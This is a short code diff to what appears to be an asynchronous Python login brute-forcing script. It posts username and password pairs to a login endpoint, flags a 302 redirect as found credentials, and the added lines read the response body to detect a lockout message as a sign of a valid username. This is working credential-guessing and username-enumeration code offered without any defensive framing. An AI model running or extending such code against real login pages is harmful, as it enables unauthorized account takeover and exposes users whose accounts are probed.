@@ -21,11 +21,15 @@ async def login(session, username, password):
     async with semaphore:
         try:
             async with session.post(url, headers=headers, data=data, allow_redirects=False) as response:
+                content = await response.content.read()
+
                 if response.status == 302:
                     print('[FOUND!] - Username: {} | Password: {} | Status: {}'.format(username, password, response.status))
                     raise Found()
                 elif response.status != 200:
                     print('[ERROR?] - Username: {} | Password: {} | Status: {}'.format(username, password, response.status))
+                elif 'You have made too many incorrect login attempts' in content.decode('utf-8'):
+                    print('[USERNAME?] - Username: {} | Password: {} | Status: {}'.format(username, password, response.status))
         finally:
             pass
 
